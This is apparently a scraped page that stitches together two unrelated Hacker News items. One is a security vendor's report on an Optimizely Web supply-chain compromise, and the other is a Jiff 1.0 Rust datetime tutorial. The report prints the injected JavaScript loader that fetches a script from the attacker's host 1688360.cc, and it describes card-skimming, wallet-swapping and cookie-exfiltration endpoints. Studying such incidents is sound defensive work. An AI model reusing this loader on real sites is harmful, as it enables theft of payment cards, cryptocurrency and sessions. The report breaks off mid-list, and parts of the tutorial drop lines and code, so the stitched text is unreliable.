Optimizely compromised, served malware on Zoom, GitLab

hackernews • 464 points • by kristjansson • November 16, 2026

World's Largest Brands Infected With Malware Via Optimizely

On 16 November 2026, malicious JavaScript was served to visitors of 178 organisations through the Optimizely Web experimentation platform. The list includes some of the most visited sites in the world: Zoom, the BBC, CNN, Salesforce, GitLab, IKEA, HSBC, Equifax, Air France-KLM, Ledger and Peacock.

The malware was a multi-purpose kit. It swapped cryptocurrency wallet addresses for the attacker's, skimmed payment cards, stole cookies and screenshots, and on iPhones and iPads it delivered the Coruna and DarkSword iOS exploit kits. Crypto has already been stolen, with verified transactions to the attackers.

This is exactly the kind of attack Report URI is designed to detect. Our platform can identify unexpected changes to trusted JavaScript, detect new scripts being loaded and reveal suspicious connections to external destinations. In this case, those signals would have exposed the malicious activity, even though the original script was being served from a trusted Optimizely domain. With an appropriate CSP in enforcement mode, organisations could have gone a step further and blocked key parts of the attack before they succeeded.

The important lesson here is that trusted JavaScript doesn't always remain trustworthy. A website can be compromised through a third-party dependency without its own code or infrastructure ever being breached.

Most of the malicious code has now been removed. At 21:52 UTC we found it in only 1 of the 188 infected snippets, down from 169 at 20:56 UTC. If your site uses Optimizely Web, or you visited any of the sites below today, read on.

What happened

Optimizely Web works by having each customer load a JavaScript "snippet" from Optimizely's CDN, for example 

https://cdn.optimizely.com/js/6395285578973184.js
. The snippet contains Optimizely's code, the customer's experiments and an optional field called Project JavaScript (
projectJS
): custom code the customer writes in their Optimizely dashboard, which runs on every page.

The attacker wrote their own code into the Project JavaScript of customer projects, and the rest of each snippet was untouched. The file was still served from 

cdn.optimizely.com
, with Optimizely's certificate, from a host that every affected site already trusted. Here is what was added to Zoom's snippet:

"projectJS": function(){(function(){try{var s=document.createElement('script');s.src='https://1688360.cc/track.js';s.async=true;(document.head||document.documentElement).appendChild(s);}catch(e){}})();

We saw three versions of the injected loader:

  • A plain 
    <script>
    tag     pointing at 
    https://1688360.cc/track.js
    (most snippets).
  • The same URL hidden in base64 with 
    atob()
    . A search for "1688360.cc" won't find it. Smartsheet's snippet was cleaned at one point and then re-infected with this version, so whoever wrote the code still had access at the time.
  • A full inline copy of the payload, which runs through 
    eval
    if 
    1688360.cc
    is blocked.

Some customers serve their snippet from their own domain, such as 

opt.scheels.com/js/<id>.js
or 
www.vodafone.com.au/js/<id>.js
. Those were affected too, because the content comes from the same Optimizely project.

We don't know how the attacker got write access to so many unrelated customer projects: a compromised Optimizely system, a compromised credential with cross-customer access, or something else. That's for Optimizely to explain. To be clear, Optimizely's CDN served exactly what it was given; this was not a CDN cache-poisoning attack. Optimizely's own sites were affected as well: the snippets for 

www.optimizely.com
and 
login.optimizely.com
both carried the code.

What the payload does

Every visitor received the same script, 

track.js
, and every part of it was active at once. What a visitor experienced depended on their device and what they did on the page.

1. Crypto address swapping (already stealing money)

The script finds any valid wallet address (BTC, ETH and EVM chains, TRON, Solana, TON, Litecoin, Bitcoin Cash, Dogecoin) and replaces it with one of the attacker's. It validates checksums so it only swaps real addresses. It swaps them in:

  • page text, form fields, links and images;
  • the clipboard, on copy and through 
    navigator.clipboard
    ;
  • outgoing 
    fetch
    /XHR requests, 
    window.open
    , navigation and the iOS share sheet.

It re-scans the page whenever it changes. Copy an address from any affected page, or from anywhere else while that tab is open, and you may paste the attacker's.

2. Card skimming

Added at 13:43 UTC. The script watches form submissions and every 

fetch
/XHR POST for a card number (Luhn-checked), expiry date and CVV. When it has all three, it sends them to 
https://1688360.cc/card.php
with 
navigator.sendBeacon
. Cards entered in hosted payment iframes (Stripe, Adyen and similar) were out of its reach. Cards typed into a site's own form fields were not.

3. Cookie and screenshot theft

When it swaps an address next to wallet or payment wording, it sends the following to 

https://1688360.cc/hit.php
:

  • the page URL;
  • document.cookie
    (cookies not marked 
    HttpOnly
    );
  • the original addresses it replaced;
  • a screenshot of the page, rendered with html2canvas.

Jiff 1.0: A datetime library for Rust

hackernews • 407 points • by burntsushi • November 16, 2026

Jiff is a datetime library for Rust that encourages you to jump into the pit of success. Jiff automatically handles many common problems related to daylight saving time by putting time zone handling front and center into the API. Jiff has already seen widespread adoption in the Rust ecosystem.

Jiff is pronounced like “gif” with a soft “g,” as in “gem.”

This blog announces the Jiff 1.0 release by giving a tour of its API.

Target audience: Rust programmers who need convenient datetime handling.

Table of Contents

The Jiff 1.0 Commitment

Jiff is already used in production in many projects: uv, Cargo, Starship, fd, Nushell, mise, Jujutsu, uutils/coreutils and even as the basis for a Temporal implementation in AWS LLRT. It is time to call it 1.0.

Unless some significant defect is found in Jiff’s API, my plan is to commit to Jiff 1.0 indefinitely. This is important because the intent is for Jiff to be an ecosystem building block that appears in the public API of other libraries. This makes Jiff an attractive public dependency, which means semver incompatible releases are likely to cause significant pain in the ecosystem. They will not be made lightly.

To see a list of breaking changes between Jiff 0.2 and Jiff 1.0, please consult the CHANGELOG.

Introduction

In programming, a datetime library’s core functionality rests at the intersection of a computer system’s concept of time and a human’s concept of time. The prevailing notion of system time is Unix time. A human’s concept of time is far more complex, but the most popular such model is the Gregorian calendar coupled with either a 12-hour or 24-hour clock. At the core of every datetime library rests some routine for converting between these concepts.

A datetime library typically provides much more than this. Indeed, datetime handling has historically been very difficult. My own belief is that the difficulty comes from poor modeling of the domain. Instead of encapsulating the complexity inside a reusable bundle of code, many datetime libraries pass some or all of the complexity on to its users. Jiff instead tries hard to encapsulate the complexity and make it difficult for users to do something wrong. (Jiff is not the first to do this!)

In this section of the blog, we’ll do some very basic introductions.

Terms

I am loath to present a dictionary. However, the datetime domain is littered with confusable terms, so I think it’s important to orient ourselves on a shared vocabulary. I’ve kept this section as small as possible. (Some terms, like “time zone,” are omitted here because they are best defined through exploration in the sections that follow.)

  • Civil time: The time you see on your clock. And in general, the time that the humans in your approximate geographic vicinity also see. That is, civil time is a human coordinated agreement for communicating time in a particular geographic region. Civil time is also known as: local time, plain time, naive time, clock time and others.
  • UTC: An abbreviation for Coordinated Universal Time; it is a time standard that serves as the basis for civil time around the world. It was originally intended to roughly correspond to mean solar time.
  • TAI: An abbreviation for International Atomic Time; it is a time standard as measured by atomic clocks. It isn’t directly connected to mean solar time.
  • Leap second: An adjustment to TAI to bring it closer to mean solar time and thus forming the basis of UTC.
  • Unix time: UTC, but ignoring leap seconds.

TAI and leap seconds won’t be a feature of this blog, but they are listed here in order to convey the difference between Unix time and UTC.

The DateTime Onion

As a way to transition into some of the core types of Jiff, I’ve come to think of its datetime types like an onion. In reverse order, we can build up its layers all the way to a 

ZonedDateTime
. So let’s start with more terms, but this time, they are also types in Jiff:

  • A 
    civil::Date
     is a plain Gregorian date, unattached to any specific location.
  • A 
    civil::Time
     is a plain time on a clock, to nanosecond precision, unattached to any specific location.
  • A 
    civil::DateTime
     combines a 
    civil::Date
    and a 
    civil::Time
    to provide both a Gregorian date and a time on a clock. It is also unattached to any specific location.
  • A 
    Timestamp
     is an unambiguous specific instant in time regardless of geographic location, represented as the number of nanoseconds since the Unix epoch.
  • A 
    TimeZone
     is a set of rules for mapping a 
    Timestamp
    to a 
    civil::DateTime
    , and vice versa, in a specific geographic region.
  • A 
    ZonedDateTime
     combines a 
    Timestamp
    , a 
    civil::DateTime
    and a 
    TimeZone
    to represent a specific instant in time in a specific geographic location.

To make this a bit more concrete, we can see what this looks like in code. Since a time zone can map from a civil datetime to an instant in time, one way to create a zoned datetime requires only a civil datetime and a time zone:

use jiff::civil;

fn main() -> anyhow::Result<()> {
    let date = civil::date(2026, 11, 1);
    let time = civil::time(17, 30, 0, 0);
    let datetime = date.to_datetime(time);
    // zdt is an initialism for "ZonedDateTime"
    let zdt = datetime.in_tz("America/New_York")?;

    assert_eq!(zdt.timestamp().as_second(), 1793572200);

    Ok(())
}

Another way to create a zoned datetime requires only a timestamp and a time zone. This is because time zones can also map a timestamp to a particular civil datetime:

use jiff::{civil, Timestamp};

fn main() -> anyhow::Result<()> {
    let timestamp = Timestamp::from_second(1793572200)?;
    let zdt = timestamp.in_tz("America/New_York")?;

    // This is a shortcut for creating a civil datetime.
    // The previous example spells it out a bit more verbosely
    // for clarity.
    let expected = civil::date(2026, 11, 1).at(17, 30, 0, 0);
    assert_eq!(zdt.datetime(), expected);

    Ok(())
}

Notice how we get the equivalent zoned datetime in both cases, but we come at it from different directions. In the first case, we start with a time that we might see on our clocks and calendars. In the second case, we start with a particular instant in time that we might get from a database or file system or some other system call.

Defining a time zone

There is one piece missing from the zoned datetime onion examples: the time zone offset. An offset represents the amount of time one must adjust UTC time in order to get civil time. For example, consider the time 

2026-11-01T22:30:00
in UTC. In order to get the civil datetime for someone living in New York, one would subtract 5 hours:

2026-11-01T22:30:00 - 05:00 = 2026-11-01T17:30:00

Indeed, every zoned datetime has an offset associated with it:

use jiff::{civil, tz, Timestamp};

fn main() -> anyhow::Result<()> {
    let timestamp = Timestamp::from_second(1793572200)?;
    let zdt = timestamp.in_tz("America/New_York")?;
    assert_eq!(zdt.offset().seconds(), -(5 * 60 * 60));

    let dt = civil::date(2026, 11, 1).at(17, 30, 0, 0);
    let zdt = dt.in_tz("America/New_York")?;
    assert_eq!(zdt.offset(), tz::offset(-5));

    Ok(())
}

NOTE: The 

America/New_York
string you see in the above example is an IANA Time Zone Database Identifier. The IANA Time Zone Database is a collection of time zone definitions that can be referenced by a short identifier string. Examples: 
Australia/Sydney
, 
Asia/Tokyo
, 
Europe/Berlin
.

When a civil datetime is combined with an offset, then what you get is always an instant in time.

With the concept of an offset introduced, we can now give a more precise definition of a time zone. A time zone is a geographic region in which civil clocks agree and which provides the following:

  • A mapping from an instant in time to an offset from UTC. The offset applied to an instant yields a civil datetime.
  • A mapping from a civil datetime to a possibly ambiguous offset from UTC. The offset applied to a civil datetime yields an instant.

Both mappings have been demonstrated in prior examples, but the mapping from civil datetime to an offset seems to be rather complicated due to some potential ambiguity. When does that ambiguity arise? An ambiguous offset occurs when the civil datetime either doesn’t correspond to a valid clock time in this time zone (e.g., when clocks are moved ahead for daylight saving time) or where there could be multiple valid clock times (e.g., when clocks are moved backward for daylight saving time).

Let’s look at some examples. In this first example, we’ll take a look at times around the daylight saving time transition from summer time to standard time in New York. In New York, the clocks were “set back” by an hour at exactly 2AM. This caused the 1AM hour to repeat itself.

use jiff::{
    civil::date,
    tz::{offset, TimeZone},
};

fn main() -> anyhow::Result<()> {
    let tz = TimeZone::get("America/New_York")?;

    // During summer time, New York's offset from UTC is -04:00.
    let zdt = date(2026, 11, 1).at(0, 30, 0, 0).to_zoned_datetime(tz.clone())?;
    assert_eq!(zdt.offset(), offset(-4));

    // During standard time, New York's offset from UTC is -05:00.
    let zdt = date(2026, 11, 1).at(2, 30, 0, 0).to_zoned_datetime(tz.clone())?;
    assert_eq!(zdt.offset(), offset(-5));

    // But what does 01:30AM mean? Is it the first repetition or the second?
    // Jiff automatically chooses the first by default.
    let zdt = date(2026, 11, 1).at(1, 30, 0, 0).to_zoned_datetime(tz.clone())?;
    assert_eq!(zdt.offset(), offset(-4));

    Ok(())
}

The above example shows how Jiff resolves the ambiguity when a “fold” occurs, or when there is a time zone transition that moves the civil time backwards. But we can actually dig down into lower level APIs to change how that ambiguity is resolved. By default, Jiff uses a “compatible” strategy that always selects the first repetition of a time in a fold. But other strategies can be selected by using APIs on a 

TimeZone
directly:

use jiff::{
    civil::date,
    tz::{offset, TimeZone},
};

fn main() -> anyhow::Result<()> {
    let tz = TimeZone::get("America/New_York")?;
    let dt = date(2026, 11, 1).at(1, 30, 0, 0);

    // The same that Jiff uses by default.
    let zdt = tz.to_ambiguous_zoned_datetime(dt).compatible()?;
    assert_eq!(zdt.offset(), offset(-4));

    // Always selects the earlier datetime.
    // For a fold, this is the same as the
    // default "compatible" strategy.
    let zdt = tz.to_ambiguous_zoned_datetime(dt).earlier()?;
    assert_eq!(zdt.offset(), offset(-4));

    // Always selects the later datetime.
    // For a fold, this selects the second
    // occurrence of the 1AM hour!
    let zdt = tz.to_ambiguous_zoned_datetime(dt).later()?;
    assert_eq!(zdt.offset(), offset(-5));

    // Always returns an error when there
    // is any ambiguity.
    assert_eq!(
        tz.to_ambiguous_zoned_datetime(dt)
            .unambiguous()
            .unwrap_err()
            .to_string(),
        "error converting datetime to instant in time zone America/New_York: \
         datetime is ambiguous \
         since it falls into a fold between offsets -04 and -05",
    );

    Ok(())
}

The same idea applies to gaps, or time zone transitions where there’s some civil time that gets skipped on civil clocks. For example, on March 8, 2026 at 2AM, civil time skipped ahead to 3AM:

use jiff::{
    civil::date,
    tz::{offset, TimeZone},
};

fn main() -> anyhow::Result<()> {
    let tz = TimeZone::get("America/New_York")?;
    let dt = date(2026, 3, 8).at(2, 30, 0, 0);

    // The "compatible" strategy selects
    // the later time in the case of gaps.
    let zdt = tz.to_ambiguous_zoned_datetime(dt).compatible()?;
    assert_eq!(zdt.offset(), offset(-4));

    // Always selects the earlier datetime.
    // For a gap, this selects the hour
    // before the gap.
    let zdt = tz.to_ambiguous_zoned_datetime(dt).earlier()?;
    assert_eq!(zdt.offset(), offset(-5));

    // Always selects the later datetime.
    // For a gap, this is the same as the
    // default "compatible" strategy.
    let zdt = tz.to_ambiguous_zoned_datetime(dt).later()?;
    assert_eq!(zdt.offset(), offset(-4));

    // Always returns an error when there
    // is any ambiguity.
    assert_eq!(
        tz.to_ambiguous_zoned_datetime(dt)
            .unambiguous()
            .unwrap_err()
            .to_string(),
        "error converting datetime to instant in time zone America/New_York: \
         datetime is ambiguous \
         since it falls into a gap between offsets -05 and -04",
    );

    Ok(())
}

Durations

There are two remaining core types, both representing some notion of a duration:

  • Span
     is a powerful hybrid duration that combines both calendar units (years, months, weeks, days) and physical time units (hours, minutes, seconds, milliseconds, microseconds, nanoseconds). It is a beefy type that preserves the individual unit values.
  • SignedDuration
     is a signed version of 
    std::time::Duration
     and always corresponds to a 96-bit integer number of nanoseconds. It can only represent physical time (units of hours or smaller) and not calendar units (units of days or greater).

A 

Span
is the preferred duration type to use whenever possible. Here’s a simple example that shows how to get the number of days between two civil dates:

use jiff::civil::date;

fn main() -> anyhow::Result<()> {
    let d1 = date(2024, 2, 1);
    let d2 = date(2024, 3, 1);
    let span = d2 - d1;
    assert_eq!(span.get_days(), 29);
    // or, equivalently:
    assert_eq!(d1.until(d2)?.get_days(), 29);

    // Flipping d1 and d2 gives the same result,
    // but negative.
    let span = d1 - d2;
    assert_eq!(span.get_days(), -29);

    Ok(())
}

Durations can also be added to dates:

use jiff::{civil::date, ToSpan};

fn main() -> anyhow::Result<()> {
    let d1 = date(2024, 2, 1);
    // This convenient syntax comes from the
    // `ToSpan` extension trait.
    let span = 29.days();
    assert_eq!(d1.checked_add(span)?, date(2024, 3, 1));

    Ok(())
}

Generally speaking, whenever there is an operation involving a 

Span
, there is an equivalent operation available with 
SignedDuration
:

use jiff::{civil::date, SignedDuration};

fn main() -> anyhow::Result<()> {
    let dt1 = date(2024, 2, 1).at(17, 30, 0, 0);
    let sdur = SignedDuration::from_mins(90);
    assert_eq!(dt1.checked_add(sdur)?, date(2024, 2, 1).at(19, 0, 0, 0));

    Ok(())
}

Notice that in the above example, we actually switched from using a 

civil::Date
to a 
civil::DateTime
. This was done to show how physical time units can be added. But note that the same can be accomplished with a 
Span
, because it combines all units:

use jiff::{civil::date, ToSpan};

fn main() -> anyhow::Result<()> {
    let dt1 = date(2024, 2, 1).at(17, 30, 0, 0);
    let span = 1.hour().minutes(30);
    assert_eq!(dt1.checked_add(span)?, date(2024, 2, 1).at(19, 0, 0, 0));

    // Calendar and physical time units can
    // be combined!
    let span = 1.month().hours(1).minutes(30);
    assert_eq!(dt1.checked_add(span)?, date(2024, 3, 1).at(19, 0, 0, 0));

    Ok(())
}

In brief, use a 

Span
when you can. But when it’s too bulky or too slow, use a 
SignedDuration
. One of the key benefits of a 
Span
is that since it represents each unit value distinctly, one can preserve the original meaning of a duration. For example, it’s common to represent the runtime of films in minutes, even when the duration exceeds one hour. Indeed, a span of 2 hours is a distinct span from a span of 120 minutes:

use jiff::ToSpan;

fn main() -> anyhow::Result<()> {
    let span1 = 2.hours();
    let span2 = 120.minutes();
    // This means the spans are distinct values
    // in memory.
    assert_ne!(span1.fieldwise(), span2.fieldwise());

    Ok(())
}

The 

Span::fieldwise
routine converts a 
Span
into a value whose units can be compared in a field-by-field fashion. To compare spans based on the actual physical duration they represent, use 
Span::compare
:

let span1 = 2.hours();
let span2 = 120.minutes();
assert!(span1.compare(span2)?.is_eq());

This was a very brief introduction to durations in Jiff. They are a lot more powerful than what is shown here. You might even try playing with the examples above to explore its nooks and crannies. We’ll cover their API in more detail in a later section.

When should I use Jiff?

Jiff isn’t always the right thing to use. Sometimes you can get by with something simpler.

First and foremost, if you’re measuring the time something takes in a program, you should almost certainly be using monotonic time. This is available via 

std::time::Instant
:

use std::time::{Duration, Instant};

fn main() -> anyhow::Result<()> {
    let start = Instant::now();

    // do some serious work
    std::thread::sleep(Duration::from_secs(1));

    let elapsed = Instant::now().duration_since(start);
    println!("{elapsed:?}");

    Ok(())
}

If you do need to compute elapsed time using your system clock, then Jiff is very convenient for that:

use std::time::Duration;

use jiff::Timestamp;

fn main() -> anyhow::Result<()> {
    // assume `start` came from somewhere
    // over a network
    let start = Timestamp::now();
    std::thread::sleep(Duration::from_secs(1));

    let elapsed = Timestamp::now().duration_since(start);
    println!("{elapsed}");

    Ok(())
}

But you don’t actually need Jiff for this. A 

std::time::SystemTime
will work perfectly fine:

use std::time::{Duration, SystemTime};

fn main() -> anyhow::Result<()> {
    // assume `start` came from somewhere
    // over a network
    let start = SystemTime::now();
    std::thread::sleep(Duration::from_secs(1));

    let elapsed = SystemTime::now().duration_since(start)?;
    println!("{elapsed:?}");

    Ok(())
}

Where Jiff starts to become useful is when you need something beyond just an integer number of seconds since the Unix epoch. For example, some very hairy math is required in order to convert a 

SystemTime
into an RFC 3339 timestamp like 
2026-11-14T21:34:00Z
.

As long as you can live in UTC completely, don’t care about local time and can work with Unix timestamps only, then the Rust standard library won’t steer you wrong.

Parsing and Formatting

Conversion to and from strings is a major part of Jiff. Jiff’s focus is primarily on interoperability via the following:

  • RFC 3339 specifies a format for fixed offset instants in time, in terms of a human readable civil datetime. For example, 
    2026-11-12T15:36:00-05:00
    . This is the serialization format used by 
    Timestamp
    .
  • RFC 9557 extends and updates RFC 3339 to add time zone information. For example, 
    2026-11-12T15:36:00-05:00[America/New_York]
    . This is the serialization format used by 
    ZonedDateTime
    .
  • ISO 8601 covers mostly everything else, including durations and civil datetimes. For example, 
    P5Y3MT20H
    is an ISO 8601 duration and 
    2026-11-12T15:30:00
    is an ISO 8601 civil datetime whose corresponding instant in time is unknown.

What Jiff actually implements is the Temporal RFC 9557 / ISO 8601 grammar for flexible parsing of datetimes from strings. For most use cases, it suffices to think in terms of RFC 3339, RFC 9557 or ISO 8601. But Jiff does support parsing strings that aren’t valid in any of those three specifications. For example, 

2026-11-12[America/New_York]
parses as if it was 
2026-11-12T00:00:00[America/New_York]
.

In this section, we’ll take a tour of how Jiff does datetime formatting and printing.

FromStr
and 
Display

Every datetime and duration type in Jiff implements the standard library 

FromStr
and 
Display
 traits. This means that it’s natural to parse datetimes:

let ts: Timestamp = "2026-10-31T05:15:00Z".parse()?;

and print them:

println!("{ts}");

Parsing is flexible, so even if there are components missing, parsing still succeeds. For example, without minutes or seconds, those components default to zero:

let dt: civil::DateTime = "2026-10-31T05".parse()?;
assert_eq!(dt.to_string(), "2026-10-31T05:00:00");

Another example of flexible parsing is that if a string contains another date type, then one can parse that. For example, one can parse a date out of an ISO 8601 datetime:

let d: civil::Date = "2026-10-31T05:30".parse()?;
assert_eq!(d.to_string(), "2026-10-31");

A 

ZonedDateTime
always uses RFC 9557 syntax, which includes the IANA time zone identifier:

let zdt: ZonedDateTime = "2026-10-31T05:30[Australia/Sydney]".parse()?;
// While the string we parsed didn't have any offset,
// one was automatically added by consulting the time
// zone definition for the civil datetime provided.
assert_eq!(zdt.to_string(), "2026-10-31T05:30:00+11:00[Australia/Sydney]");

If you want to print a zoned datetime using only RFC 3339 syntax, then you can do so by formatting the timestamp directly with the zoned datetime’s offset:

let zdt: ZonedDateTime = "2026-10-31T05:30[Australia/Sydney]".parse()?;
assert_eq!(
    zdt.timestamp().display_with_offset(zdt.offset()).to_string(),
    "2026-10-31T05:30:00+11:00",
);

The 

Span
and 
SignedDuration
 types also support the 
FromStr
and 
Display
traits via the ISO 8601 duration format. For example:

use jiff::{SignedDuration, Span};

fn main() -> anyhow::Result<()> {
    let duration = "PT5H30M";

    let span: Span = duration.parse()?;
    assert_eq!(span.to_string(), "PT5H30M");

    let sdur: SignedDuration = duration.parse()?;
    assert_eq!(sdur.to_string(), "PT5H30M");

    Ok(())
}

Since a 

Span
is a hybrid duration that also supports calendar units, it can parse durations with calendar units and physical time units. A 
SignedDuration
can only parse durations with physical time units:

use jiff::{SignedDuration, Span};

fn main() -> anyhow::Result<()> {
    let duration = "P11Y2M28DT5H30M";

    let span: Span = duration.parse()?;
    assert_eq!(span.to_string(), "P11Y2M28DT5H30M");

    let err = duration.parse::<SignedDuration>().unwrap_err();
    assert_eq!(
        err.to_string(),
        "parsing ISO 8601 duration in this context requires \
         that the duration contain a time component \
         and no components of days or greater",
    );

    Ok(())
}

The ISO 8601 duration format does, however, have some shortcomings that we’ll discuss in the next section.

The “friendly” Duration Format

Because ISO 8601 duration strings enjoy broad support, it is the default in Jiff for both 

Span
and 
SignedDuration
. However, it has two important shortcomings:

  • It is difficult to read. For example, in 
    P11Y2M28DT5H30M
    , the lack of whitespace makes the unit values and the unit labels all run together.
  • An ISO 8601 duration cannot unambiguously represent all possible 
    Span
    values.

The second shortcoming is best seen with an example. Consider a 

Span
that is 2000 milliseconds. If you convert this to an ISO 8601 duration string and then parse it back, you end up with 2 seconds instead:

use jiff::{Span, ToSpan};

fn main() -> anyhow::Result<()> {
    let original = 2000.milliseconds();
    assert_eq!(original.to_string(), "PT2S");

    let got: Span = "PT2S".parse()?;

    // The spans have different unit values!
    assert_eq!(original.get_seconds(), 0);
    assert_eq!(original.get_milliseconds(), 2000);
    assert_eq!(got.get_seconds(), 2);
    assert_eq!(got.get_milliseconds(), 0);

    Ok(())
}

This might not be desirable for cases where you want a span’s string format to faithfully represent all possible distinct values of a span.

Parsing a friendly duration is as easy as parsing an ISO 8601 duration: the 

FromStr

let span: Span = "6y 10mo 3d 23h".parse()?;
// Recall that `Span::fieldwise` permits

assert_eq!(span.fieldwise(), 6.years().months(10).days(3).hours(23));

Span::to_string()

let span = 2000.milliseconds();

assert_eq!(format!("{span:#}"), "2000ms");

String

use jiff::{fmt::friendly, ToSpan};

fn main() -> anyhow::Result<()> {

        .comma_after_designator(true)
        .spacing(friendly::Spacing::BetweenUnitsAndDesignators)
        .designator(friendly::Designator::Verbose);

    let span = 6.years().months(10).days(3).hours(23);
    let mut buf = String::new();
    PRINTER.print_span(&span, &mut buf)?;
    assert_eq!(buf, "6 years, 10 months, 3 days, 23 hours");

    Ok(())
}

jiff::fmt::friendly

strptime
and 
strftime

The POSIX 

strptime
and POSIX 
strftime
 routines are far from the ideal way to format and parse datetimes, but they are ubiquitous and most programmers are familiar with them. Because of their ubiquity, and because of the utility of being able to format and parse bespoke datetime formats, Jiff provides implementations of these routines that are mostly POSIX compatible.

Every datetime type in Jiff comes with 

strptime
and 
strftime
routines. For example, to parse a civil date in the US 
month/day/year
format:

let date = civil::Date::strptime("%m/%d/%Y", "11/13/2026")?;
assert_eq!(date.to_string(), "2026-11-13");

Or to format a zoned datetime in a convenient to read representation for English speakers:

let zdt = civil::date(2026, 11, 13).at(17, 30, 0, 0).in_tz("Australia/Sydney")?;
assert_eq!(
    zdt.strftime("%a, %b %d, %Y %H:%M %Z").to_string(),
    "Fri, Nov 13, 2026 17:30 AEDT",
);

Callers can also use lower level APIs from 

jiff::fmt::strtime
to get access to each parsed component individually:

use jiff::{civil, fmt::strtime::BrokenDownTime};

fn main() -> anyhow::Result<()> {
    let tm = BrokenDownTime::parse(
        "%a, %b %d, %Y %H:%M",
        "Fri, Nov 13, 2026 17:30",
    )?;
    assert_eq!(tm.weekday(), Some(civil::Weekday::Friday));
    assert_eq!(tm.month(), Some(11));
    assert_eq!(tm.day(), Some(13));
    assert_eq!(tm.year(), Some(2026));
    assert_eq!(tm.hour(), Some(17));
    assert_eq!(tm.minute(), Some(30));
    assert_eq!(tm.second(), None);

    Ok(())
}

The 
jiff::fmt
module

While the above tour should cover most use cases, there are sometimes reasons for exerting more control over parsing or formatting. Or for supporting alternate formats like RFC 2822. The 

jiff::fmt
module is meant to cover these use cases at the cost of more complex APIs. For example, consider parsing an RFC 2822 datetime string from a 
&[u8]
(which lets callers avoid a UTF-8 validation check):

use jiff::fmt::rfc2822;

fn main() -> anyhow::Result<()> {
    static PARSER: rfc2822::DateTimeParser = rfc2822::DateTimeParser::new();

    let data = b"Sat, 13 Jul 2024 15:09:59 -0400";
    let ts = PARSER.parse_timestamp(data)?;
    assert_eq!(ts.to_string(), "2024-07-13T19:09:59Z");
    Ok(())
}

Another example shows how to change the default disambiguation strategy when the provided civil datetime is ambiguous. For example, Sydney, Australia moved the clocks backwards at 

2026-04-05T03:00:00
local time. That is, they went from UTC offset 
+11
to UTC offset 
+10
. So what happens if we try to parse a time on the clock that is repeated as a result?

use jiff::ZonedDateTime;

fn main() -> anyhow::Result<()> {
    let zdt: ZonedDateTime = "2026-04-05T02:30[Australia/Sydney]".parse()?;
    assert_eq!(zdt.to_string(), "2026-04-05T02:30:00+11:00[Australia/Sydney]");
    Ok(())
}

Here, the first occurrence of 

02:30
is selected, just before Sydney leaves daylight saving time. Now, the data itself can actually select the desired offset:

use jiff::ZonedDateTime;

fn main() -> anyhow::Result<()> {
    let zdt: ZonedDateTime =
        "2026-04-05T02:30+11:00[Australia/Sydney]".parse()?;
    assert_eq!(zdt.to_string(), "2026-04-05T02:30:00+11:00[Australia/Sydney]");

    let zdt: ZonedDateTime =
        "2026-04-05T02:30+10:00[Australia/Sydney]".parse()?;
    assert_eq!(zdt.to_string(), "2026-04-05T02:30:00+10:00[Australia/Sydney]");

    Ok(())
}

But this happens because there is no ambiguity in the data. Since the offset is supplied, the exact instant in time is known. Going back to 

2026-04-05T02:30[Australia/Sydney]
, which is ambiguous because it could refer to two different instants in time, how do we modify the strategy for resolving that ambiguity? We can’t using the standard library 
FromStr
trait, so we instead have to construct our own parser manually, just like we did for RFC 2822 parsing above. This example shows how to do that and all of the different disambiguation options. Remember, UTC offset +11:00 corresponds to the first occurrence of 
2026-04-05T02:30
on the clocks of folks in Sydney while UTC offset +10:00 corresponds to the second occurrence.

use jiff::{fmt::temporal::DateTimeParser, tz::Disambiguation};

fn main() -> anyhow::Result<()> {
    let string = "2026-04-05T02:30[Australia/Sydney]";

    // "compatible" is the default strategy, which selects
    // the earlier time in a fold (usually moving from daylight
    // saving time to standard time) and the later time in a
    // gap (usually moving from standard time to daylight
    // saving time).
    let parser = DateTimeParser::new().disambiguation(Disambiguation::Compatible);
    let zdt = parser.parse_zoned_datetime(string)?;
    assert_eq!(zdt.to_string(), "2026-04-05T02:30:00+11:00[Australia/Sydney]");

    // "earlier" always selects the first occurrence
    // in a fold, or the time before a gap.
    // So this is the same as compatible in this case,
    // since our civil time is in a fold.
    let parser = DateTimeParser::new().disambiguation(Disambiguation::Earlier);
    let zdt = parser.parse_zoned_datetime(string)?;
    assert_eq!(zdt.to_string(), "2026-04-05T02:30:00+11:00[Australia/Sydney]");

    // "later" always selects the second occurrence
    // in a fold, or the time after a gap.
    // So this is different from "compatible" for a
    // fold. Notice that the UTC +10:00 offset is
    // chosen.
    let parser = DateTimeParser::new().disambiguation(Disambiguation::Later);
    let zdt = parser.parse_zoned_datetime(string)?;
    assert_eq!(zdt.to_string(), "2026-04-05T02:30:00+10:00[Australia/Sydney]");

    // "reject" means that if the instant is ambiguous,
    // then an error is returned.
    let parser = DateTimeParser::new().disambiguation(Disambiguation::Reject);
    let err = parser.parse_zoned_datetime(string).unwrap_err();
    assert_eq!(
        err.to_string(),
        "error converting datetime to instant \
         in time zone Australia/Sydney: \
         datetime is ambiguous since it falls \
         into a fold between offsets +11 and +10",
    );

    Ok(())
}

The 

jiff::fmt
module contains lots of other goodies that we won’t cover here, including, but not limited to:

  • The ability to format directly into an existing allocation.
  • Parsing a datetime into its individual components.
  • Helpers for 
    serde
     integration.

Locale Sensitive Formatting via ICU4X Integration

No section on datetime formatting would be complete without addressing locales. In this context, a locale is a set of user preferences used for formatting datetimes. This is useful when you want to present a datetime to an end user that doesn’t expect standard formats from RFC 3339, RFC 9557 or ISO 8601.

Jiff itself does not provide any facilities for dealing with locales. Instead, users can opt into this support via the ICU4X project. To make conversions between Jiff and ICU4X, the 

jiff-icu
integration crate can be used.

Here’s an example showing how to format a zoned datetime in the 

fr-LA
locale: (You’ll need to run 
cargo add icu jiff-icu
to your project for this to work.)

use icu::{
    calendar::Iso,
    datetime::{fieldsets, DateTimeFormatter},
    locale::locale,
    time::{zone::models::AtTime, TimeZoneInfo},
};
use jiff::ZonedDateTime;
use jiff_icu::ConvertFrom as _;

fn main() -> anyhow::Result<()> {
    // Firstly, do a conversion from Jiff's zoned datetime to ICU's.
    let jiff_zdt: ZonedDateTime =
        "2024-09-10T23:37:20-04[America/New_York]".parse()?;
    let icu_zdt =
        icu::time::ZonedDateTime::<Iso, TimeZoneInfo<AtTime>>::convert_from(
            &jiff_zdt,
        );

    // Second, create a datetime formatter for the fr-LA locale:
    let formatter = DateTimeFormatter::try_new(
        locale!("fr-LA").into(),
        fieldsets::YMDET::medium().with_zone(fieldsets::zone::SpecificLong),
    )?;

    // Thirdly, format the zoned datetime.
    assert_eq!(
        formatter.format(&icu_zdt).to_string(),
